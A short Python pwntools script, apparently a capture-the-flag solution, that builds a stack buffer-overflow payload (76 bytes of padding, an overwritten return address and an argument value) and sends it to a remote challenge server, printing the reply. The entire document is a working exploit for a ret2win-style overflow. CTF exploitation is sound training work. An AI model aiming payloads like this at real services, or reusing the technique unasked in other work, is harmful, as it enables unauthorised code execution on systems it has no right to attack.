from pwn import *

payload = 'A'*76+p32(0x08049197)+'AAAAAAAA'+p32(0x182)
#p = process('./winners.py')
p = remote('chals20.cybercastors.com', 14434)
#print p.recvuntil(': ')
p.sendline(payload)
print p.recvall()
